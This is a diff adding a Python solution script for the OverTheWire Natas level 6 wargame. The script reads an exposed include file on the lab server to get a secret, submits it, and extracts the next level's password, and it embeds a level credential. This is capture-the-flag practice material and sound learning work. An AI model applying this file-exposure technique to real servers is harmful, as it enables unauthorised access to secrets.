@@ -1,0 +1,42 @@
+import requests
+from requests.auth import HTTPBasicAuth
+from bs4 import BeautifulSoup
+import re
+
+url = 'http://natas6.natas.labs.overthewire.org/'
+password = '0RoJwHdSKWFTYR5WuiAewauSuNaBXned' # change to actual password
+
+#------------Source Code---------
+#<?
+#include "includes/secret.inc";
+#    if(array_key_exists("submit", $_POST)) {
+#        if($secret == $_POST['secret']) {
+#        print "Access granted. The password for natas7 is <censored>";}
+#    else {
+#        print "Wrong secret";}
+#    }
+#?>
+#----------secret.inc------
+#<?
+#$secret = "FOEIUWGHFEEUHOFUOIU"; // change to actual
+#?>
+
+# we should send a $secret token to server and name of button "submit"
+r1 = requests.get(url=url+"includes/secret.inc", auth=HTTPBasicAuth('natas6', password=password))
+
+# search start " and end " in response and extract $secret
+start_q = r1.text.find('"')+1
+end_q = r1.text.find('"', start_q)
+secret = r1.text[start_q:end_q]
+
+# send secret to server
+data = {'secret':f'{secret}', 'submit':'submit'}
+r = requests.post(url=url, auth=HTTPBasicAuth('natas6', password=password),data=data)
+
+
+soup = BeautifulSoup(r.text, 'html.parser')
+response = soup.find('div').text
+
+#regular match to password
+pas = re.search(r'The password for natas7 is (\w+)',response)
+print(f'natas7:{pas.group(1)}')
